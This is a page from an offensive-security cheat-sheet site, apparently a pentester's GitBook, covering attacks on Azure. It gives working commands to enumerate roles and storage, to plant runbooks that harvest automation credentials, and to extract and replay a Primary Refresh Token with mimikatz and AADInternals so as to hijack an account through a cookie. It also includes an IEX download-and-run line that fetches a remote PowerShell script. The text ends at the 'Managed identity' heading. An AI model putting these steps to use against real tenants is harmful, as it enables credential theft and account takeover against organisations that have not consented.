
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Azure Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">

    
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../">
            
                <a href="../../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" >
            
                <a target="_blank" href="https://twitter.com/HackerOtter">
            
                    
                    Follow On Twitter
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="2.1" >
            
                <span>
            
                    
                    Formation
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" >
            
                <span>
            
                    
                    RTO Malware Development
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1.1" data-path="../../Formation/RTO - Malware Development/0 - Introduction.html">
            
                <a href="../../Formation/RTO - Malware Development/0 - Introduction.html">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.2" data-path="../../Formation/RTO - Malware Development/1 - PE.html">
            
                <a href="../../Formation/RTO - Malware Development/1 - PE.html">
            
                    
                    PE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.3" data-path="../../Formation/RTO - Malware Development/2 - Payload Storage.html">
            
                <a href="../../Formation/RTO - Malware Development/2 - Payload Storage.html">
            
                    
                    Payload Storage
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.4" data-path="../../Formation/RTO - Malware Development/3 - Payload Encryption.html">
            
                <a href="../../Formation/RTO - Malware Development/3 - Payload Encryption.html">
            
                    
                    Payload Encryption
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.5" data-path="../../Formation/RTO - Malware Development/4 - Function Call Obfuscation.html">
            
                <a href="../../Formation/RTO - Malware Development/4 - Function Call Obfuscation.html">
            
                    
                    Function Call Obfuscation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.6" data-path="../../Formation/RTO - Malware Development/5 - Backdooring PE.html">
            
                <a href="../../Formation/RTO - Malware Development/5 - Backdooring PE.html">
            
                    
                    Backdooring PE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.7" data-path="../../Formation/RTO - Malware Development/6 - Payload Injection.html">
            
                <a href="../../Formation/RTO - Malware Development/6 - Payload Injection.html">
            
                    
                    Payload Injection
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="3.1" >
            
                <span>
            
                    
                    Malware
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.1" >
            
                <span>
            
                    
                    Docs
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.1.1" data-path="../../Malware/Docs/Code snippet.html">
            
                <a href="../../Malware/Docs/Code snippet.html">
            
                    
                    Code Snippet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.1.2" data-path="../../Malware/Docs/Dumpbin.html">
            
                <a href="../../Malware/Docs/Dumpbin.html">
            
                    
                    Dumpbin
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.1.3" data-path="../../Malware/Docs/NTStructure.html">
            
                <a href="../../Malware/Docs/NTStructure.html">
            
                    
                    NTStructure
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.1.4" data-path="../../Malware/Docs/Passing arguments.html">
            
                <a href="../../Malware/Docs/Passing arguments.html">
            
                    
                    Passing Arguments
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.1.2" data-path="../../Malware/CoffLoader.html">
            
                <a href="../../Malware/CoffLoader.html">
            
                    
                    COFF Loader
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3" data-path="../../Malware/Docs/Dumpbin.html">
            
                <a href="../../Malware/Docs/Dumpbin.html">
            
                    
                    Dumpbin
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4" data-path="../../Malware/Elastic EDR.html">
            
                <a href="../../Malware/Elastic EDR.html">
            
                    
                    Elastic EDR
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.5" data-path="../../Malware/Function hooking.html">
            
                <a href="../../Malware/Function hooking.html">
            
                    
                    Function Hooking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6" data-path="../../Malware/Kernel callback.html">
            
                <a href="../../Malware/Kernel callback.html">
            
                    
                    Kernel Callback
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.7" data-path="../../Malware/Module stomping.html">
            
                <a href="../../Malware/Module stomping.html">
            
                    
                    Module Stomping
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.8" data-path="../../Malware/Reflective DLL injection.html">
            
                <a href="../../Malware/Reflective DLL injection.html">
            
                    
                    Reflective DLL Injection
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="4.1" >
            
                <span>
            
                    
                    Pentest
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.1" >
            
                <span>
            
                    
                    Cloud
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="4.1.1.1" data-path="Azure.html">
            
                <a href="Azure.html">
            
                    
                    Azure
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.2" >
            
                <span>
            
                    
                    Configuration Review
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.2.1" data-path="../Configuration review/Database.html">
            
                <a href="../Configuration review/Database.html">
            
                    
                    Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.2.2" data-path="../Configuration review/Kubernetes.html">
            
                <a href="../Configuration review/Kubernetes.html">
            
                    
                    Kubernetes
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.2.3" data-path="../Configuration review/KubernetesCIS.html">
            
                <a href="../Configuration review/KubernetesCIS.html">
            
                    
                    KubernetesCIS
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.3" >
            
                <span>
            
                    
                    Services
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.3.1" data-path="../Services/AD.html">
            
                <a href="../Services/AD.html">
            
                    
                    AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.2" data-path="../Services/DNS.html">
            
                <a href="../Services/DNS.html">
            
                    
                    DNS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.3" data-path="../Services/IPMI.html">
            
                <a href="../Services/IPMI.html">
            
                    
                    IPMI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.4" data-path="../Services/Kerberos.html">
            
                <a href="../Services/Kerberos.html">
            
                    
                    Kerberos
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.5" data-path="../Services/LDAP.html">
            
                <a href="../Services/LDAP.html">
            
                    
                    LDAP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.6" data-path="../Services/Memcached.html">
            
                <a href="../Services/Memcached.html">
            
                    
                    Memcached
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.7" data-path="../Services/NFS.html">
            
                <a href="../Services/NFS.html">
            
                    
                    NFS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.8" data-path="../Services/Oracle database.html">
            
                <a href="../Services/Oracle database.html">
            
                    
                    Oracle Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.9" data-path="../Services/RPC.html">
            
                <a href="../Services/RPC.html">
            
                    
                    RPC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.10" data-path="../Services/SMB.html">
            
                <a href="../Services/SMB.html">
            
                    
                    SMB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.11" data-path="../Services/SNMP.html">
            
                <a href="../Services/SNMP.html">
            
                    
                    SNMP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.12" data-path="../Services/Tomcat.html">
            
                <a href="../Services/Tomcat.html">
            
                    
                    Tomcat
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.13" data-path="../Services/WebDAV.html">
            
                <a href="../Services/WebDAV.html">
            
                    
                    WebDAV
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.4" >
            
                <span>
            
                    
                    Techniques
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.4.1" data-path="../Techniques/Abuse tokens.html">
            
                <a href="../Techniques/Abuse tokens.html">
            
                    
                    Abuse Tokens
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.2" data-path="../Techniques/Buffer overflow.html">
            
                <a href="../Techniques/Buffer overflow.html">
            
                    
                    Buffer Overflow
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.3" data-path="../Techniques/Command injection.html">
            
                <a href="../Techniques/Command injection.html">
            
                    
                    Command Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.4" data-path="../Techniques/Data exfiltration.html">
            
                <a href="../Techniques/Data exfiltration.html">
            
                    
                    Data Exfiltration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.5" data-path="../Techniques/Exploit handles.html">
            
                <a href="../Techniques/Exploit handles.html">
            
                    
                    Exploit handles
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.6" data-path="../Techniques/Filtering.html">
            
                <a href="../Techniques/Filtering.html">
            
                    
                    Filtering
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.7" data-path="../Techniques/Kioske escape.html">
            
                <a href="../Techniques/Kioske escape.html">
            
                    
                    Kioske Escape
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.8" data-path="../Techniques/LFI.html">
            
                <a href="../Techniques/LFI.html">
            
                    
                    LFI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.9" data-path="../Techniques/Password spraying.html">
            
                <a href="../Techniques/Password spraying.html">
            
                    
                    Password Spraying
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.10" data-path="../Techniques/Pivoting.html">
            
                <a href="../Techniques/Pivoting.html">
            
                    
                    Pivoting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.11" >
            
                <span>
            
                    
                    Privilege Escalation
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.4.11.1" data-path="../Techniques/Privileges escalation/Windows.html">
            
                <a href="../Techniques/Privileges escalation/Windows.html">
            
                    
                    Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.11.2" data-path="../Techniques/Privileges escalation/Linux.html">
            
                <a href="../Techniques/Privileges escalation/Linux.html">
            
                    
                    Linux
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.4.12" data-path="../Techniques/Reverse shell.html">
            
                <a href="../Techniques/Reverse shell.html">
            
                    
                    Reverse Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.13" data-path="../Techniques/Shellshock.html">
            
                <a href="../Techniques/Shellshock.html">
            
                    
                    Shellshock
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.14" data-path="../Techniques/SQL injection.html">
            
                <a href="../Techniques/SQL injection.html">
            
                    
                    SQL Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.15" data-path="../Techniques/SSTI.html">
            
                <a href="../Techniques/SSTI.html">
            
                    
                    SSTI
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.5" >
            
                <span>
            
                    
                    Technology
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.5.1" data-path="../Technology/AD.html">
            
                <a href="../Technology/AD.html">
            
                    
                    AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.5.2" data-path="../Technology/IOS.html">
            
                <a href="../Technology/IOS.html">
            
                    
                    IOS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.5.3" data-path="../Technology/NAC.html">
            
                <a href="../Technology/NAC.html">
            
                    
                    NAC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.5.4" data-path="../Technology/Port Knocking.html">
            
                <a href="../Technology/Port Knocking.html">
            
                    
                    Port Knocking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.5.5" data-path="../Technology/SAML.html">
            
                <a href="../Technology/SAML.html">
            
                    
                    SAML
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.5.6" data-path="../Technology/SAP.html">
            
                <a href="../Technology/SAP.html">
            
                    
                    SAP
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.6" >
            
                <span>
            
                    
                    Tools
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.6.1" data-path="../Tools/BloundHound.html">
            
                <a href="../Tools/BloundHound.html">
            
                    
                    BloundHound
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.2" data-path="../Tools/CME.html">
            
                <a href="../Tools/CME.html">
            
                    
                    CME
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.3" data-path="../Tools/Curl.html">
            
                <a href="../Tools/Curl.html">
            
                    
                    Curl
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.4" data-path="../Tools/Ffuf.html">
            
                <a href="../Tools/Ffuf.html">
            
                    
                    FFUF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.5" data-path="../Tools/Find.html">
            
                <a href="../Tools/Find.html">
            
                    
                    Find
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.6" data-path="../Tools/Hydra.html">
            
                <a href="../Tools/Hydra.html">
            
                    
                    Hydra
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.7" data-path="../Tools/PowerView.html">
            
                <a href="../Tools/PowerView.html">
            
                    
                    PowerView
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.8" data-path="../Tools/Powershell.html">
            
                <a href="../Tools/Powershell.html">
            
                    
                    Powershell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.9" data-path="../Tools/Responder.html">
            
                <a href="../Tools/Responder.html">
            
                    
                    Responder
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.10" data-path="../Tools/Strace.html">
            
                <a href="../Tools/Strace.html">
            
                    
                    Strace
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.11" data-path="../Tools/Wfuzz.html">
            
                <a href="../Tools/Wfuzz.html">
            
                    
                    Wfuzz
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="5.1" >
            
                <span>
            
                    
                    Rainy Sunday
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.1.1" data-path="../../Serveur/KMS/KMS.html">
            
                <a href="../../Serveur/KMS/KMS.html">
            
                    
                    KMS Activation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.1.2" data-path="../../Serveur/LicenceKey.html">
            
                <a href="../../Serveur/LicenceKey.html">
            
                    
                    Licence Key
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../.." >Azure</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="azure">Azure</h1>
<h1 id="table-of-content">Table of content</h1>
<!-- toc -->
<ul>
<li><a href="#tools">Tools</a><ul>
<li><a href="#roadrecon">Roadrecon</a></li>
<li><a href="#scoutsuite">ScoutSuite</a></li>
</ul>
</li>
<li><a href="#azpowershell">AzPowershell</a><ul>
<li><a href="#install">Install</a></li>
<li><a href="#connect">Connect</a></li>
</ul>
</li>
<li><a href="#iam-enumeration">IAM enumeration</a></li>
<li><a href="#list-storage-containers">List storage containers</a></li>
<li><a href="#azautomation">AzAutomation</a><ul>
<li><a href="#azautomationaccount">AzAutomationAccount</a></li>
<li><a href="#desired-state-configuration">Desired State Configuration</a><ul>
<li><a href="#list-the-dsc">List the <code>DSC</code></a></li>
<li><a href="#export-the-configuration">Export the configuration</a></li>
</ul>
</li>
<li><a href="#runbook">Runbook</a><ul>
<li><a href="#list-the-runbooks">List the <code>Runbooks</code></a></li>
<li><a href="#export-scripts">Export scripts</a></li>
<li><a href="#create-new-runbook">Create new Runbook</a></li>
<li><a href="#start-a-runbook">Start a runbook</a></li>
</ul>
</li>
<li><a href="#automation-credentials">Automation Credentials</a></li>
</ul>
</li>
<li><a href="#prt">PRT</a></li>
<li><a href="#service-principal">Service Principal</a><ul>
<li><a href="#list-accounts">List accounts</a></li>
</ul>
</li>
<li><a href="#docker">Docker</a><ul>
<li><a href="#list-docker-containers-inside-a-registry">List docker containers inside a registry</a></li>
<li><a href="#connect-to-a-docker-with-azure-credentials">Connect to a docker with azure credentials</a></li>
</ul>
</li>
<li><a href="#connect-to-azure-vm-with-azureaccount">Connect to Azure VM with AzureAccount</a></li>
<li><a href="#managed-identity">Managed identity</a></li>
<li><a href="#webapp">WebApp</a><ul>
<li><a href="#list-webapp">List webapp</a></li>
<li><a href="#configuration">Configuration</a></li>
<li><a href="#webssh">WebSSH</a></li>
</ul>
</li>
<li><a href="#consent-grant-attack">Consent grant attack</a><ul>
<li><a href="#set-up-the-trap">Set up the trap</a></li>
<li><a href="#set-the-application-permission">Set the application permission</a></li>
<li><a href="#create-a-new-application">Create a new application</a></li>
<li><a href="#send-the-malicious-url">Send the malicious URL</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->
<h1 id="tools">Tools</h1>
<h2 id="roadrecon">Roadrecon</h2>
<p>ROADtools is a framework to interact with Azure AD. It currently consists of a library (roadlib) and the ROADrecon Azure AD exploration tool.
<a href="https://github.com/dirkjanm/ROADtools" target="_blank">github</a></p>
<pre><code class="lang-bash">python3 -m pip install roadrecon
roadrecon auth --device-code
roadrecon gather
road-recon gui
</code></pre>
<h2 id="scoutsuite">ScoutSuite</h2>
<p>Scout Suite is an open source multi-cloud security-auditing tool, which enables security posture assessment of cloud environments. Using the APIs exposed by cloud providers, Scout Suite gathers configuration data for manual inspection and highlights risk areas. Rather than going through dozens of pages on the web consoles, Scout Suite presents a clear view of the attack surface automatically.
<a href="https://github.com/nccgroup/ScoutSuite" target="_blank">github</a></p>
<pre><code class="lang-bash"><span class="hljs-comment"># Connect to Azure and run the following command</span>
python scout.py azure --cli
</code></pre>
<h1 id="azpowershell">AzPowershell</h1>
<h2 id="install">Install</h2>
<pre><code class="lang-powershell">Install-Module Az -Force
</code></pre>
<h2 id="connect">Connect</h2>
<pre><code class="lang-powershell"><span class="hljs-variable">$Username</span> = ${username}
<span class="hljs-variable">$Password</span> = ${password}
<span class="hljs-variable">$User</span> = (<span class="hljs-built_in">New-Object</span> System.management.automation.PSCredential(<span class="hljs-variable">$Username</span>, (ConvertToSecureString <span class="hljs-variable">$Password</span> -AsPlainText -Force)))
Connect-AzAccount -Credential <span class="hljs-variable">$User</span>
</code></pre>
<h1 id="iam-enumeration">IAM enumeration</h1>
<pre><code class="lang-powershell"><span class="hljs-comment"># Get user role</span>
Get-AzRoleAssignment | <span class="hljs-built_in">Format-List</span> SignInName,RoleDefinitionName,Scope

<span class="hljs-comment"># Azure AD Groups</span>
Get-AzAdGroup

<span class="hljs-comment"># Azure AD Users</span>
Get-AzADUser
</code></pre>
<pre><code class="lang-powershell">az role assignement list --all
</code></pre>
<h1 id="list-storage-containers">List storage containers</h1>
<p>With <code>Reader</code> permission on <code>Storage Accounts</code> it is possible to retrieve containers exposed with public access:</p>
<pre><code class="lang-powershell">(Get-AzStorageAccount | Get-AzStorageContainer).cloudBlobContainer | select Uri,@{n=<span class="hljs-string">&apos;PublicAccess&apos;</span>;e={<span class="hljs-variable">$_</span>.Properties.PublicAccess}}
</code></pre>
<h1 id="azautomation">AzAutomation</h1>
<h2 id="azautomationaccount">AzAutomationAccount</h2>
<p>The <code>Contributor</code> role of an automation account grants full access to all the resources in the automation account such as <code>Runbooks</code> and <code>Desired State Configuration</code>.</p>
<pre><code class="lang-powershell">Get-AzAutomationAccount
</code></pre>
<h2 id="desired-state-configuration">Desired State Configuration</h2>
<h3 id="list-the-dsc">List the <code>DSC</code></h3>
<pre><code class="lang-powershell">Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
</code></pre>
<h3 id="export-the-configuration">Export the configuration</h3>
<pre><code class="lang-powershell"><span class="hljs-variable">$DSCName</span> = ${dscToExport}
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {<span class="hljs-variable">$_</span>.name -march <span class="hljs-variable">$DSCName</span>} | Export-AzAutomationDscConfiguration -OutputFolder (<span class="hljs-built_in">get-location</span>) -Debug
</code></pre>
<h2 id="runbook">Runbook</h2>
<h3 id="list-the-runbooks">List the <code>Runbooks</code></h3>
<pre><code class="lang-powershell">Get-AzAutomationAccount | Get-AzAutomationRunbook
</code></pre>
<h3 id="export-scripts">Export scripts</h3>
<pre><code class="lang-powershell">Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder (pwd)
</code></pre>
<h3 id="create-new-runbook">Create new Runbook</h3>
<p><code>Runbook</code> can access to automation credentials configured in the environment. </p>
<p>It can be interesting to create a <code>Runbook</code> to fetch these credentials</p>
<pre><code class="lang-powershell"><span class="hljs-variable">$ResourceGroupName</span> = ${resource}
<span class="hljs-variable">$AutomationAccountName</span> = ${automationAccount}
<span class="hljs-variable">$RunbookName</span> = ${newRunbookName}

@<span class="hljs-string">&apos; 
${runbookScript}
&apos;</span>@ | <span class="hljs-built_in">out-file</span> -encofing ascii <span class="hljs-string">&apos;runbook.ps1&apos;</span>

New-AzAutomationRunbook -Name <span class="hljs-variable">$RunbookName</span> -AutomationAccountName <span class="hljs-variable">$AutomationAccountName</span> -ResourceGroupName <span class="hljs-variable">$ResourceGroupName</span> -Type PowerShell

Import-AzAutomationRunbook -Path <span class="hljs-string">&apos;runbook.ps1&apos;</span> -Name <span class="hljs-variable">$RunbookName</span> -Type PowerShell -AutomationAccountName <span class="hljs-variable">$AutomationAccountName</span> -ResourceGroupName <span class="hljs-variable">$ResourceGroupName</span> -Force

Publish-AzAutomationRunbook -Name <span class="hljs-variable">$RunbookName</span> -AutomationAccountName &#xC2;utomationAccountName -ResourceGroupName <span class="hljs-variable">$ResourceGroupName</span>
</code></pre>
<h3 id="start-a-runbook">Start a runbook</h3>
<pre><code class="lang-powershell"><span class="hljs-variable">$ResourceGroupName</span> = ${resource}
<span class="hljs-variable">$AutomationAccountName</span> = ${automationAccount}
<span class="hljs-variable">$RunbookName</span> = ${newRunbookName}
<span class="hljs-variable">$start</span> = Start-AzAutomationRunBook -Name <span class="hljs-variable">$RunbookName</span> -AutomationAccountName <span class="hljs-variable">$AutomationAccountName</span> -ResourceGroupName <span class="hljs-variable">$ResourceGroupName</span>
<span class="hljs-built_in">start-sleep</span> <span class="hljs-number">20</span>
(<span class="hljs-variable">$start</span> | Get-AzAutomationJob | Get-AzAutomationJobOutput.Summary)
</code></pre>
<h2 id="automation-credentials">Automation Credentials</h2>
<pre><code class="lang-powershell">Get-AzAutomationAccount | Get-AzAutomationCredential
</code></pre>
<h1 id="prt">PRT</h1>
<p>Extract the  PRT<code>PRT</code> and unprotect the keys</p>
<pre><code class="lang-powershell"><span class="hljs-comment"># mimikatz</span>
sekurlsa::cloudap
Dpapi::cloudapkd /keyvalue:${keyValue} /unprotect
</code></pre>
<p>Generate a new <code>PRT</code></p>
<pre><code class="lang-powershell">Install-Module AADInternals
</code></pre>
<pre><code class="lang-powershell"><span class="hljs-variable">$MimikatzPRT</span> = <span class="hljs-string">&quot;${prtToken}&quot;</span>
<span class="hljs-comment"># Add padding</span>
<span class="hljs-keyword">while</span>(<span class="hljs-variable">$MimikatzPRT</span>.Length % <span class="hljs-number">4</span>) {<span class="hljs-variable">$MimikatzPRT</span> += <span class="hljs-string">&quot;=&quot;</span>}
<span class="hljs-comment"># Convert from Base 64</span>
<span class="hljs-variable">$PRT</span> = [text.encoding]::UTF8.GetString([convert]::FromBase64String(<span class="hljs-variable">$MimikatzPRT</span>))
<span class="hljs-comment"># Add the session key (Clear key) to a variable</span>
<span class="hljs-variable">$MimikatzKey</span> = <span class="hljs-string">&quot;${clearKey}&quot;</span>
<span class="hljs-comment"># Convert to byte array and base 64 encode</span>
<span class="hljs-variable">$SKey</span> = [convert]::ToBase64String( [byte[]] (<span class="hljs-variable">$MimikatzKey</span> <span class="hljs-nomarkup">-replace</span> <span class="hljs-string">&apos;..&apos;</span>, <span class="hljs-string">&apos;0x$&amp;,&apos;</span> -split <span class="hljs-string">&apos;,&apos;</span> <span class="hljs-nomarkup">-ne</span> <span class="hljs-string">&apos;&apos;</span>))
<span class="hljs-comment"># Generate a new PRTToken with nonce</span>
<span class="hljs-variable">$prtToken</span> = New-AADIntUserPRTToken -RefreshToken <span class="hljs-variable">$PRT</span> -SessionKey <span class="hljs-variable">$SKey</span> -GetNonce
<span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$prtToken</span>
</code></pre>
<p>Inject the <code>PRT</code> as a cookie to hijack the account :</p>
<ul>
<li><code>Cookie name</code> : x-ms-RefreshTokenCredential</li>
<li><code>HTTPOnly</code> : true</li>
<li><code>Domain</code> : login.microsoft.com</li>
<li><code>Path</code> : /</li>
</ul>
<h1 id="service-principal">Service Principal</h1>
<p>The <code>Service Principal</code> account used to launch specific services. Thus, the service does not use a real user account to run but a dedicated account with limited privileges.</p>
<p>These account <code>username</code> and <code>password</code> are <code>UUID</code>.</p>
<h2 id="list-accounts">List accounts</h2>
<pre><code class="lang-powershell">Get-AzureAdPrincpal -All <span class="hljs-literal">$true</span>
</code></pre>
<h1 id="docker">Docker</h1>
<p>The <code>Azure Docker URI</code> look like <code>${tenant}.azurecr.io</code>. </p>
<h2 id="list-docker-containers-inside-a-registry">List docker containers inside a registry</h2>
<p>The <a href="https://raw.githubusercontent.com/NetSPI/MicroBurst/master/Misc/Get-AzACR.ps1" target="_blank">Get-AzACR</a> script can be used to enumerate <code>Docker</code> pull <code>URL</code>&apos;s</p>
<pre><code class="lang-powershell">IEX (<span class="hljs-built_in">New-Object</span> Net.WebClient).downloadstring(<span class="hljs-string">&quot;https://raw.githubusercontent.com/NetSPI/MicroBurst/master/Misc/Get-AzACR.ps1&quot;</span>)
<span class="hljs-built_in">Set-ItemProperty</span> -Path <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main&quot;</span> -Name <span class="hljs-string">&quot;DisableFirstRunCustomize&quot;</span> -Value <span class="hljs-number">2</span>
Get-AzACR -username ${username} -password ${password} -registry ${registryURI}
</code></pre>
<h2 id="connect-to-a-docker-with-azure-credentials">Connect to a docker with azure credentials</h2>
<pre><code class="lang-powershell">docker login ${registryURI} --username ${username} --password ${password}
</code></pre>
<h1 id="connect-to-azure-vm-with-azureaccount">Connect to Azure VM with AzureAccount</h1>
<pre><code class="lang-powershell">ssh -l ${userMail} ${ip} -p ${port}
<span class="hljs-comment"># ssh -l yoann.dequeker@wavestone.com 10.10.10.10 -p 1337</span>
</code></pre>
<h1 id="managed-identity">Managed identity</h1>
